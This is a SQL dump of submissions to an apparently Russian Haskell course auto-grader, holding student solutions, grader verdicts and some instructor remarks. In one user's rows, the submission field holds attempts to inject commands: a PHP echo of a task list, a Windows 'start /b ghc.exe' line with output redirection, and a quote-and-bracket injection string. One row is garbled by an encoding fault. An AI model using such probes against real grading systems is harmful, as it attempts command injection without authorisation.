(1958, 64, '2118411', '2012-10-13 10:50:17', 1, '-- sent by mail', '<br/>Тесты успешно пройдены!'),
(1959, 61, '419046', '2012-10-13 10:58:22', 1, 'sumDiv n = sumDiv1 n 1 0\r\n\r\nsumDiv1 n m k = if (m == n)\r\n\r\n                then k\r\n\r\n                else\r\n\r\n                  if (mod n m == 0)\r\n\r\n                  then sumDiv1 n (m + 1) (k + m)\r\n\r\n                  else sumDiv1 n (m + 1) k\r\n\r\nperfects n = filter (x -> x == (sumDiv x)) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1960, 61, '397095', '2012-10-13 12:45:40', 1, 'sumDiv n = sum (filter (x -> mod n x == 0) [1..(div n 2)])\r\nperfects n = filter (x -> x == sumDiv x) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1961, 62, '397095', '2012-10-13 12:50:56', 1, 'sumDiv n = sum (filter (x -> mod n x == 0) [1..(div n 2)])\r\namicables n = [ (x,y) | x <- [1..n], let y = sumDiv x, sumDiv y == x, y <= n, x < y]', '<br/>Тесты успешно пройдены!'),
(1962, 63, '397095', '2012-10-13 12:53:41', 1, 'fives = [mult x|x <- [1..]]\r\nmult 0 = 0\r\nmult n = 5 + 10 * mult (n-1)', '<br/>Тесты успешно пройдены!'),
(1963, 62, '419046', '2012-10-13 13:12:48', 1, 'sumDiv n = sumDiv1 n 1 0\r\nsumDiv1 n m k = if (m == n)\r\n                then k\r\n                else\r\n                  if (mod n m == 0)\r\n                  then sumDiv1 n (m + 1) (k + m)\r\n                  else sumDiv1 n (m + 1) k\r\namicables n = [(a, b) | a <-[1..n], b <-[1..n], (a < b), ( a == (sumDiv b)), ( b == (sumDiv \r\n\r\na))]\r\n-- Работает правильно, но очень медленно\r\n   --- Да, хорошо что вы на это обратили внимание!\r\n   --- На самом деле очень легко вашу программу очень существенно ускорить, буквально изменить несколько символов.\r\n   --- И ситуация тут очень похожа, на то, что было в coins, очень похожая неэффективность.\r\n   --- Но ОК, мы это разберем. ', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(1964, 62, '44060', '2012-10-13 16:03:31', 2, 'amicables n = [(a,b) | a<-[1..n], b<-[(a+1)..n], b == sumdiv a, a == sumdiv b]\r\nsumDiv n = sum [i | i<-[1..(n-1)], n `mod` i == 0]\r\n   --- Пожалуйста, сделайте, чтобы у вас решение компилировалась (у вас в одном слове очевидная опечатка)\r\n   --- Если не получится, то пришлите снова, я и так зачту, но вообще мне кажется исправить совсем не сложно.', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(1965, 59, 'alexey.solovyew@gmail.com', '2012-10-13 17:24:41', 1, 'ntc ntcn ntc ', '<br/>Тесты успешно пройдены!'),
(1966, 44, 'alexey.solovyew@gmail.com', '2012-10-13 17:24:50', 0, 'ntc ntcn ntc ', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1967, 44, 'alexey.solovyew@gmail.com', '2012-10-13 17:25:40', 1, 'dioph _ = 1', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1968, 61, 'alexey.solovyew@gmail.com', '2012-10-13 17:26:18', 0, 'sumDiv _ = sumDiv _', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1969, 61, 'alexey.solovyew@gmail.com', '2012-10-13 17:30:28', 0, 'wefwefwef', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1970, 61, 'alexey.solovyew@gmail.com', '2012-10-13 17:30:44', 0, 'sumDiv _ = sumDiv _', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1971, 61, 'alexey.solovyew@gmail.com', '2012-10-13 17:33:02', 0, 'echo "Result of tasklist: ".$tasklist." end result";', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1972, 61, 'alexey.solovyew@gmail.com', '2012-10-13 17:37:19', 0, 'start /b C:ghcghc-7.4.2inghc.exe -e "sumDiv 10" D:skupon.rufileshaskellfilesfiletask61.hs > resres.txt', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1973, 48, 'erwert', '2012-10-13 18:23:13', 1, 'myreverse xs = (foldr (x y-> y.(x:)) id xs) []', '<br/>Тесты успешно пройдены!'),
(1974, 48, '63706456', '2012-10-13 18:25:41', 0, 'myreverse xs = (foldr (x y-> y.(x:)) id xs) []', 'Не удалось вычислить выражение "myreverse [1,2,3,4]", проверьте правильность синтаксиса'),
(1975, 48, '63706456', '2012-10-13 18:26:20', 1, 'myreverse xs = (foldr (x y-> y.(x:)) id xs) []', '<br/>Тесты успешно пройдены!'),
(1976, 62, 'erwert', '2012-10-13 18:55:01', 1, 'mpl a b\r\n	| mod a b == 0 = mpl (div a b) b + 1\r\n	| otherwise = 0\r\n\r\nprimes a = not (elem 0 (map (x -> mod a x) [2..(floor.sqrt.fromIntegral) a]))\r\n\r\nsdiv a b\r\n	| b == 1 = 1\r\n	| primes b = b + 1\r\n	| mod b a == 0 = sdiv (a + 1) (div b (a ^ k)) * x\r\n	| otherwise = sdiv (a + 1) b\r\n	where\r\n	k = mpl b a\r\n	x =  div (a ^ (k + 1) - 1) (a - 1)\r\n\r\nsumDiv n = sdiv 2 n - n\r\n\r\namicables n = [(x, y) | (x, y, z) <- (filter ((e, r, w) -> e < r) (zip3 a b c)), x == z]\r\n	where \r\n	 a = [200..n]\r\n	 b = [sumDiv t | t <- a]\r\n	 c = [sumDiv t | t <- b]', '<br/>Тесты успешно пройдены!'),
(1977, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:09:45', 0, 'gewgergerg', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1978, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:10:10', 0, 'sumDiv _ = 1', 'Выражение имеет неправильное значение: sumDiv 10'),
(1979, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:10:57', 0, 'sumDiv _ = 1', 'Выражение имеет неправильное значение: sumDiv 10'),
(1980, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:11:32', 0, 'sumDiv _ = sumDiv _', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1981, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:11:46', 0, 'sumDiv _ = 1', 'Выражение имеет неправильное значение: sumDiv 10'),
(1982, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:12:42', 0, 'sumDiv x = 1 * sumDiv x', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1983, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:13:00', 0, 'sumDiv 10 = 8', 'Не удалось вычислить выражение "perfects 100", проверьте правильность синтаксиса'),
(1984, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:13:48', 0, 'sumDiv x = 1 * sumDiv x', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1985, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:17:18', 0, 'sumDiv x = sumDiv x', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1986, 48, 'jamesbrain', '2012-10-13 19:21:51', 1, 'myreverse l = foldr (elem g acc -> g (elem:acc)) id l []\r\n', '<br/>Тесты успешно пройдены!'),
(1987, 61, 'alexey.solovyew@gmail.com', '2012-10-13 19:24:16', 1, 'sumDiv x = sumDiv x', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1988, 61, 'tonyo', '2012-10-13 19:27:48', 1, 'sumDiv n = sum $ filter (x -> n `mod` x == 0) [1..(n-1)]\r\n\r\nperfects n = filter  (x -> sumDiv x == x) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1989, 61, 'hasp', '2012-10-13 19:28:04', 1, 'sumDiv n = let sumDivI acc k n = if k*k >= n then acc else if n `mod` k == 0 then (sumDivI (acc+(if k*k == n then k else k + (n `div` k))) (k+1) n) else sumDivI acc (k+1) n\r\n	in (sumDivI 0 2 n) + 1\r\n	\r\nperfects n = foldr (	 acc-> if t == sumDiv t then t:acc else acc ) [] [2..n]	\r\n', '<br/>Тесты успешно пройдены!'),
(1990, 62, 'hasp', '2012-10-13 19:28:30', 1, 'sumDiv n = let sumDivI acc k n = if k*k >= n then acc else if n `mod` k == 0 then (sumDivI (acc+(if k*k == n then k else k + (n `div` k))) (k+1) n) else sumDivI acc (k+1) n\r\n	in (sumDivI 0 2 n) + 1\r\n\r\n\r\namicables n = foldl (acc (s, e) -> if s < e && sumDiv s == e then (s,e):acc else acc) [] (map (	 -> (sumDiv t, t)) [1..n])\r\n', '<br/>Тесты успешно пройдены!'),
(1991, 18, 'alexey.solovyew@gmail.com', '2012-10-13 19:32:10', 1, '<><><><><>&&&''''''''''""""><>', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(1992, 49, 'hasp', '2012-10-13 19:32:29', 1, '/**\r\n * Задачка была отправлена на почту\r\n */\r\nopen class MyTree<E>{}\r\nclass MyNode<E>(val leftTree: MyTree<E>, val value: E, val rightTree: MyTree<E>) : MyTree<E>() {}\r\nclass EmptyNode<E> : MyTree<E>() {}\r\n\r\nfun any<E>(tree: MyTree<E>, p: (E) -> Boolean): Boolean {\r\n    if (tree is EmptyNode<E>) {\r\n        return false\r\n    } else {\r\n        val node = tree as MyNode<E>\r\n        return p(node.value) || any(node.rightTree, p) || any(node.leftTree, p)\r\n    }\r\n}\r\n\r\nfun main(args: Array<String>) {\r\n    val falseTree = MyNode<Int>(MyNode<Int>(EmptyNode<Int>(), -4, MyNode<Int>(EmptyNode<Int>(), 3, EmptyNode<Int>())), 8,\r\n            MyNode<Int>(MyNode<Int>(EmptyNode<Int>(), 2, EmptyNode<Int>()), 6, EmptyNode<Int>()))\r\n    val a2 = any(falseTree, {i -> i > 10})\r\n    println(a2)\r\n}', '<br/>Тесты успешно пройдены!'),
(1993, 50, 'hasp', '2012-10-13 19:33:56', 1, 'import java.util.*;\r\n\r\n/**\r\n * Задачка была отправлена на почту\r\n */\r\npublic abstract class MyTree<E> {\r\n    public MyTree<E> getLeft() {return left;}\r\n    public MyTree<E> getRight() {return right;}\r\n    public E getValue() {return value;}\r\n\r\n    abstract class Predicate {abstract boolean satisfy(E e);}\r\n\r\n    MyTree(MyTree<E> left, MyTree<E> right, E value) {\r\n        this.left = left; this.right = right; this.value = value;\r\n    }\r\n\r\n    MyTree() {\r\n        left = null; right = null; value = null;\r\n    }\r\n\r\n    private final MyTree<E> left;\r\n    private final MyTree<E> right;\r\n    private final E value;\r\n\r\n    abstract boolean any(Predicate p);\r\n\r\n    static class Node<E> extends MyTree<E> {\r\n        Node(MyTree<E> left, MyTree<E> right, E value) {\r\n            super(left, right, value);\r\n        }\r\n\r\n        boolean any(Predicate p) {\r\n            return p.satisfy(getValue()) || getLeft().any(p) || getRight().any(p);\r\n        }\r\n    }\r\n\r\n    static class Empty<E> extends MyTr', '<br/>Тесты успешно пройдены!'),
(1994, 62, 'tonyo', '2012-10-13 19:49:20', 1, 'sumDiv n = sum $ filter (x -> n `mod` x == 0) [1..(n-1)]\r\n\r\namicables n = [(y,x) | x <- [1..n], y <- [1..(x-1)], sumDiv x == y, sumDiv y == x]\r\n   --- OK, но на самом деле тут легко можно написать гораздо эффективнее, \r\n   --- и примерно то той же причине, что в примере с coins\r\n   --- Но ОК, это мы разберем\r\n', '<br/>Тесты успешно пройдены!'),
(1995, 64, 'tonyo', '2012-10-13 20:27:29', 1, 'data Node = Node Integer Node Node | Empty\r\n\r\nfoldTree f res Empty = res \r\nfoldTree f res (Node value left right) = f (f value lval) rval\r\n    where lval = foldTree f res left; rval = foldTree f res right \r\n            --- Просто как замечание, тут можно написать немного более хитро, чтобы каждый раз вызывать f один раз                                                                                                                              \r\n\r\nmain = do\r\n    print $ foldTree (+) 0 t1\r\n    print $ foldTree (*) 1 t2\r\n    where t1 =  Node 2 \r\n                    (Node 3 Empty Empty)\r\n                    Empty\r\n          t2 =  Node 2\r\n                    (Node 3 Empty Empty)\r\n                    (Node 4 Empty Empty)\r\n', '<br/>Тесты успешно пройдены!'),
(1996, 47, '214982', '2012-10-13 20:39:44', 0, 'powerset [x] = [[x], []]\r\npowerset (x:xs) = let y = (powerset xs) in y++(addCool x y)\r\n\r\naddCool x [y] = (x:y):[]\r\naddCool x (x1:xs) = ((x:x1):[])++(addCool x xs)\r\n\r\n \r\n', 'Не удалось вычислить выражение "powerset []", проверьте правильность синтаксиса'),
(1997, 47, '214982', '2012-10-13 20:40:39', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = let y = (powerset xs) in y++(addCool x y)\r\n\r\naddCool x [y] = (x:y):[]\r\naddCool x (x1:xs) = ((x:x1):[])++(addCool x xs)\r\n   --- OK, но addCool, на самом деле, просто addCool x xs = map (	->x:t) xs или map (x:) xs\r\n\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(1998, 47, '5477377', '2012-10-13 20:50:24', 1, 'pow [] a = a:[]\r\npow (x:xs) a = (pow xs a) ++ (pow xs (a++[x]))\r\n    --- Лучше не a++[x], а x:a   (вам же все равно, с какой стороны добавлять, а это будет гораздо быстрее)\r\npowerset x = pow x []', '<br/>Тесты успешно пройдены!'),
(1999, 62, 'alexey.solovyew@gmail.com', '2012-10-13 21:21:57', 0, 'amicables n = [(a,b) | a<-[1..n], b<-[(a+1)..n], b == sumdiv a, a == sumdiv b]\r\nsumDiv n = sum [i | i<-[1..(n-1)], n `mod` i == 0]', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2000, 62, 'alexey.solovyew@gmail.com', '2012-10-13 21:22:50', 0, 'amicables n = [(a,b) | a<-[1..n], b<-[(a+1)..n], b == sumdiv a, a == sumdiv b]\r\nsumDiv n = sum [i | i<-[1..(n-1)], n `mod` i == 0]', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2001, 63, '5477377', '2012-10-13 21:23:03', 1, 'fives = 5: map (x -> 10*x + 5) fives', '<br/>Тесты успешно пройдены!'),
(2002, 62, 'alexey.solovyew@gmail.com', '2012-10-13 21:27:28', 0, 'amicables n = [(a,b) | a<-[1..n], b<-[(a+1)..n], b == sumDiv a, a == sumDiv b]\r\nsumDiv n = sum [i | i<-[1..(n-1)], n `mod` i == 0]', '<br/>Тесты успешно пройдены!'),
(2003, 62, 'alexey.solovyew@gmail.com', '2012-10-13 21:37:21', 0, '-- для того, чтобы точно ответить отрицательно, достаточно найти 3 элемента, которые будут идти в невозрастающем порядке, в противном случае ещё нужно проверить равенство длин частей\r\nparts2 s = if ((length s == 0)||(length s `mod` 2 == 1))\r\n		then False\r\n	   else\r\n	   if (length s == 2)\r\n		then True\r\n	   else \r\n-- проверка списка, в котором как минимум 4 элемента (но чётное количество)\r\n		parts1 s [] (-1000) (-1000) s\r\n\r\nparts1 (x:s) [] max1 max2 ss = parts1 s ([x]) x (-1000) ss\r\nparts1 [] _ _ _ ss = checklength ss [] [] (length ss)\r\nparts1 (x:s) [z] y max2 ss = if (x>y) \r\n				then parts1 s ([x]) x (-1000) ss\r\n			     else\r\n				parts1 s ([y, x]) y x ss\r\n-- y>=x [y,x]\r\n-- max1>=max2 [max1, max2] - пара максимальных элементов списка на текущий момент (выд. в отд список), эти элементы всегда оказываются в разных половинах разделённого списка\r\n\r\nparts1 (z:[]) [m1, m2] max1 max2 ss = if (z<=max2) \r\n					then False\r\n				        else checklength ss [] [] (length ss)\r\n-- т.е. разделить на 2 возрастающих списка можно, но надо сравнить их длину\r\n\r\nparts1 (z:s) [m1, m2] max1 max2 ss = if (z>max1)\r\n					then parts1 s ([max1, max2]) max1 max2 ss\r\n				      else\r\n				      if ((z>max2)&&(z<=max1))\r\n					then parts1 s ([max1, z]) max1 z ss\r\n				      else False \r\n-- т.к. нашли 3 элемента, расположенных строго по убыванию, ещё не дойдя до конца списка: max1>=max2>=z\r\n\r\n-- собственно формирование списков, при этом добавление элементов для простоты будем производить в head\r\nchecklength [] s1 s2 n = if (length s1 == length s2) \r\n				then True\r\n			 else False\r\nchecklength (x:s) [] [] n = checklength s ([x]) [] n\r\nchecklength (x:s) (x1:s1) [] n = if (x<=x1) \r\n					then (checklength s (x1:s1) [x] n)\r\n				 else\r\n				 if (2*length (x1:s1) >= n)\r\n					then checklength s (x1:s1) [x] n\r\n				 else ((checklength s (x:x1:s1) [] n)||(checklength s (x1:s1) [x] n))\r\nchecklength (x:s) (x1:s1) (x2:s2) n = if ((x>x1)&&(x<=x2))\r\n					then checklength s (x:x1:s1) (x2:s2) n\r\n				      else\r\n				      if ((x>x2)&&(x<=x1))\r\n					then checklength s (x1:s1) (x:x2:s2) n\r\n				      else \r\n-- в случае, когда так получилось, что уже одна из половин забита полностью, может получиться, что (x<=x1)&&(x<=x2), (разбиение возможно, но только на части разной длины, а равные элементы д.б. точно в разных частях)\r\n				      if ((x<=x1)&&(x<=x2)) \r\n					then False\r\n				      else\r\n-- проверяем текущую длину половин\r\n				      if (2*length (x1:s1) == n) \r\n					then checklength s (x1:s1) (x:x2:s2) n\r\n                                        \r\n				      else\r\n				      if (2*length (x2:s2) == n)\r\n					then checklength s (x:x1:s1) (x2:s2) n\r\n				      else\r\n				        ((checklength s (x:x1:s1) (x2:s2) n)||(checklength s (x1:s1) (x:x2:s2) n))', 'Проверка - дебаг записи решения 4.2.hs'),
(2004, 62, 'alexey.solovyew@gmail.com', '2012-10-13 21:39:56', 0, '-- ��� ����, ����� ����� �������� ������������, ���������� ����� 3 ��������, ������� ����� ���� � �������������� �������, � ��������� ������ ��� ����� ��������� ��������� ���� ������ parts2 s = if ((length s == 0)||(length s `mod` 2 == 1)) then False else if (length s == 2) then True else -- �������� ������, � ������� ��� ������� 4 �������� (�� ������ ����������) parts1 s [] (-1000) (-1000) s parts1 (x:s) [] max1 max2 ss = parts1 s ([x]) x (-1000) ss parts1 [] _ _ _ ss = checklength ss [] [] (length ss) parts1 (x:s) [z] y max2 ss = if (x>y) then parts1 s ([x]) x (-1000) ss else parts1 s ([y, x]) y x ss -- y>=x [y,x] -- max1>=max2 [max1, max2] - ���� ������������ ��������� ������ �� ������� ������ (���. � ��� ������), ��� �������� ������ ����������� � ������ ��������� ������������ ������ parts1 (z:[]) [m1, m2] max1 max2 ss = if (z<=max2) then False else checklength ss [] [] (length ss) -- �.�. ��������� �� 2 ������������ ������ �����, �� ���� �������� �� ����� parts1 (z:s) [m1, m2] max1 max2 ss = if (z>max1) then parts1 s ([max1, max2]) max1 max2 ss else if ((z>max2)&&(z<=max1)) then parts1 s ([max1, z]) max1 z ss else False -- �.�. ����� 3 ��������, ������������� ������ �� ��������, ��� �� ����� �� ����� ������: max1>=max2>=z -- ���������� ������������ �������, ��� ���� ���������� ��������� ��� �������� ����� ����������� � head checklength [] s1 s2 n = if (length s1 == length s2) then True else False checklength (x:s) [] [] n = checklength s ([x]) [] n checklength (x:s) (x1:s1) [] n = if (x<=x1) then (checklength s (x1:s1) [x] n) else if (2*length (x1:s1) >= n) then checklength s (x1:s1) [x] n else ((checklength s (x:x1:s1) [] n)||(checklength s (x1:s1) [x] n)) checklength (x:s) (x1:s1) (x2:s2) n = if ((x>x1)&&(x<=x2)) then checklength s (x:x1:s1) (x2:s2) n else if ((x>x2)&&(x<=x1)) then checklength s (x1:s1) (x:x2:s2) n else -- � ������, ����� ��� ����������, ��� ��� ���� �� ������� ������ ���������, ����� ����������, ��� (x<=x1)&&(x<=x2), (��������� ��������, �� ������ �� ����� ������ �����, � ������ �������� �.�. ����� � ������ ������) if ((x<=x1)&&(x<=x2)) then False else -- ��������� ������� ����� ������� if (2*length (x1:s1) == n) then checklength s (x1:s1) (x:x2:s2) n else if (2*length (x2:s2) == n) then checklength s (x:x1:s1) (x2:s2) n else ((checklength s (x:x1:s1) (x2:s2) n)||(checklength s (x1:s1) (x:x2:s2) n)) ', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2005, 62, 'alexey.solovyew@gmail.com', '2012-10-13 21:44:28', 0, 'lol\r\n\n\r\n\n\r\n\nlol\r\n\n\r\n\nlololol\n', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2006, 62, 'alexey.solovyew@gmail.com', '2012-10-13 22:07:46', 0, 'lol', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2007, 62, 'alexey.solovyew@gmail.com', '2012-10-13 22:09:11', 0, '-- для того, чтобы точно ответить отрицательно, достаточно найти 3 элемента, которые будут идти в невозрастающем порядке, в противном случае ещё нужно проверить равенство длин частей\r\n\nparts2 s = if ((length s == 0)||(length s mod 2 == 1))\r\n\n		then False\r\n\n	   else\r\n\n	   if (length s == 2)\r\n\n		then True\r\n\n	   else \r\n\n-- проверка списка, в котором как минимум 4 элемента (но чётное количество)\r\n\n		parts1 s [] (-1000) (-1000) s\r\n\n\r\n\nparts1 (x:s) [] max1 max2 ss = parts1 s ([x]) x (-1000) ss\r\n\nparts1 [] _ _ _ ss = checklength ss [] [] (length ss)\r\n\nparts1 (x:s) [z] y max2 ss = if (x>y) \r\n\n				then parts1 s ([x]) x (-1000) ss\r\n\n			     else\r\n\n				parts1 s ([y, x]) y x ss\r\n\n-- y>=x [y,x]\r\n\n-- max1>=max2 [max1, max2] - пара максимальных элементов списка на текущий момент (выд. в отд список), эти элементы всегда оказываются в разных половинах разделённого списка\r\n\n\r\n\nparts1 (z:[]) [m1, m2] max1 max2 ss = if (z<=max2) \r\n\n					then False\r\n\n				        else checklength ss [] [] (length ss)\r\n\n-- т.е. разделить на 2 возрастающих списка можно, но надо сравнить их длину\r\n\n\r\n\nparts1 (z:s) [m1, m2] max1 max2 ss = if (z>max1)\r\n\n					then parts1 s ([max1, max2]) max1 max2 ss\r\n\n				      else\r\n\n				      if ((z>max2)&&(z<=max1))\r\n\n					then parts1 s ([max1, z]) max1 z ss\r\n\n				      else False \r\n\n-- т.к. нашли 3 элемента, расположенных строго по убыванию, ещё не дойдя до конца списка: max1>=max2>=z\r\n\n\r\n\n-- собственно формирование списков, при этом добавление элементов для простоты будем производить в head\r\n\nchecklength [] s1 s2 n = if (length s1 == length s2) \r\n\n				then True\r\n\n			 else False\r\n\nchecklength (x:s) [] [] n = checklength s ([x]) [] n\r\n\nchecklength (x:s) (x1:s1) [] n = if (x<=x1) \r\n\n					then (checklength s (x1:s1) [x] n)\r\n\n				 else\r\n\n				 if (2*length (x1:s1) >= n)\r\n\n					then checklength s (x1:s1) [x] n\r\n\n				 else ((checklength s (x:x1:s1) [] n)||(checklength s (x1:s1) [x] n))\r\n\nchecklength (x:s) (x1:s1) (x2:s2) n = if ((x>x1)&&(x<=x2))\r\n\n					then checklength s (x:x1:s1) (x2:s2) n\r\n\n				      else\r\n\n				      if ((x>x2)&&(x<=x1))\r\n\n					then checklength s (x1:s1) (x:x2:s2) n\r\n\n				      else \r\n\n-- в случае, когда так получилось, что уже одна из половин забита полностью, может получиться, что (x<=x1)&&(x<=x2), (разбиение возможно, но только на части разной длины, а равные элементы д.б. точно в разных частях)\r\n\n				      if ((x<=x1)&&(x<=x2)) \r\n\n					then False\r\n\n				      else\r\n\n-- проверяем текущую длину половин\r\n\n				      if (2*length (x1:s1) == n) \r\n\n					then checklength s (x1:s1) (x:x2:s2) n\r\n\n				      else\r\n\n				      if (2*length (x2:s2) == n)\r\n\n					then checklength s (x:x1:s1) (x2:s2) n\r\n\n				      else\r\n\n				        ((checklength s (x:x1:s1) (x2:s2) n)||(checklength s (x1:s1) (x:x2:s2) n))\n', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2008, 62, 'alexey.solovyew@gmail.com', '2012-10-13 22:12:00', 1, '-- для того, чтобы точно ответить отрицательно, достаточно найти 3 элемента, которые будут идти в невозрастающем порядке, в противном случае ещё нужно проверить равенство длин частей\r\n\r\nparts2 s = if ((length s == 0)||(length s mod 2 == 1))\r\n\r\n		then False\r\n\r\n	   else\r\n\r\n	   if (length s == 2)\r\n\r\n		then True\r\n\r\n	   else \r\n\r\n-- проверка списка, в котором как минимум 4 элемента (но чётное количество)\r\n\r\n		parts1 s [] (-1000) (-1000) s\r\n\r\n\r\n\r\nparts1 (x:s) [] max1 max2 ss = parts1 s ([x]) x (-1000) ss\r\n\r\nparts1 [] _ _ _ ss = checklength ss [] [] (length ss)\r\n\r\nparts1 (x:s) [z] y max2 ss = if (x>y) \r\n\r\n				then parts1 s ([x]) x (-1000) ss\r\n\r\n			     else\r\n\r\n				parts1 s ([y, x]) y x ss\r\n\r\n-- y>=x [y,x]\r\n\r\n-- max1>=max2 [max1, max2] - пара максимальных элементов списка на текущий момент (выд. в отд список), эти элементы всегда оказываются в разных половинах разделённого списка\r\n\r\n\r\n\r\nparts1 (z:[]) [m1, m2] max1 max2 ss = if (z<=max2) \r\n\r\n					then False\r\n\r\n				        else checklength ss [] [] (length ss)\r\n\r\n-- т.е. разделить на 2 возрастающих списка можно, но надо сравнить их длину\r\n\r\n\r\n\r\nparts1 (z:s) [m1, m2] max1 max2 ss = if (z>max1)\r\n\r\n					then parts1 s ([max1, max2]) max1 max2 ss\r\n\r\n				      else\r\n\r\n				      if ((z>max2)&&(z<=max1))\r\n\r\n					then parts1 s ([max1, z]) max1 z ss\r\n\r\n				      else False \r\n\r\n-- т.к. нашли 3 элемента, расположенных строго по убыванию, ещё не дойдя до конца списка: max1>=max2>=z\r\n\r\n\r\n\r\n-- собственно формирование списков, при этом добавление элементов для простоты будем производить в head\r\n\r\nchecklength [] s1 s2 n = if (length s1 == length s2) \r\n\r\n				then True\r\n\r\n			 else False\r\n\r\nchecklength (x:s) [] [] n = checklength s ([x]) [] n\r\n\r\nchecklength (x:s) (x1:s1) [] n = if (x<=x1) \r\n\r\n					then (checklength s (x1:s1) [x] n)\r\n\r\n				 else\r\n\r\n				 if (2*length (x1:s1) >= n)\r\n\r\n					then checklength s (x1:s1) [x] n\r\n\r\n				 else ((checklength s (x:x1:s1) [] n)||(checklength s (x1:s1) [x] n))\r\n\r\nchecklength (x:s) (x1:s1) (x2:s2) n = if ((x>x1)&&(x<=x2))\r\n\r\n					then checklength s (x:x1:s1) (x2:s2) n\r\n\r\n				      else\r\n\r\n				      if ((x>x2)&&(x<=x1))\r\n\r\n					then checklength s (x1:s1) (x:x2:s2) n\r\n\r\n				      else \r\n\r\n-- в случае, когда так получилось, что уже одна из половин забита полностью, может получиться, что (x<=x1)&&(x<=x2), (разбиение возможно, но только на части разной длины, а равные элементы д.б. точно в разных частях)\r\n\r\n				      if ((x<=x1)&&(x<=x2)) \r\n\r\n					then False\r\n\r\n				      else\r\n\r\n-- проверяем текущую длину половин\r\n\r\n				      if (2*length (x1:s1) == n) \r\n\r\n					then checklength s (x1:s1) (x:x2:s2) n\r\n\r\n				      else\r\n\r\n				      if (2*length (x2:s2) == n)\r\n\r\n					then checklength s (x:x1:s1) (x2:s2) n\r\n\r\n				      else\r\n\r\n				        ((checklength s (x:x1:s1) (x2:s2) n)||(checklength s (x1:s1) (x:x2:s2) n))\r\n', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2009, 47, '532002', '2012-10-14 05:50:58', 1, 'powerset [] = [[]]\r\n\r\npowerset (x:xs) = [x:ys | ys <- powerset xs] ++ powerset xs\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2010, 56, '532002', '2012-10-14 06:34:38', 0, 'allLists n k = filter (/=[]) (powerset1 k [1..n]) where\r\n\npowerset1 0 xs = [[]]\r\n\npowerset1 k [] = [[]] \r\n\npowerset1 k (x:xs) = [x:ys | ys<-powerset1 (k-1) xs,length ys == k-1] ++ powerset1 k xs\r\n\n\r\n\n\r\n\n\r\n\n\n', 'Выражение имеет неправильное значение: length (allLists 3 3)'),
(2011, 56, '532002', '2012-10-14 06:42:33', 1, 'allLists n k =  powerset1 k [1..n] where\r\n\r\npowerset1 0 xs = [[]]\r\n\r\npowerset1 k xs = [x:ys | x<-xs,ys<-powerset1 (k-1) xs,length ys == k-1] \r\n  --- Последняя проверка вроде не нужна? powerset1 и так будет выдавать строки только нужной длины. \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2012, 62, '517309', '2012-10-14 07:18:23', 3, 'sumDiv n = sumDiv1 n 1 0\r\nsumDiv1 n m k = if (m == n)\r\n                then k\r\n                else\r\n                  if (mod n m == 0)\r\n                  then sumDiv1 n (m + 1) (k + m)\r\n                  else sumDiv1 n (m + 1) k\r\namicables n = [(a, b) | a <-[1..n], b <-[1..n], (a < b), ( a == (sumDiv b)), ( b == (sumDiv a))]', '<br/>Тесты успешно пройдены!'),
(2013, 65, '517309', '2012-10-14 08:38:55', 3, 'cantor = [(3,2)]', '<br/>Тесты успешно пройдены!'),
(2014, 66, '517309', '2012-10-14 08:39:57', 3, 'generalizedCantor 3 = [[2,1,2]]', '<br/>Тесты успешно пройдены!'),
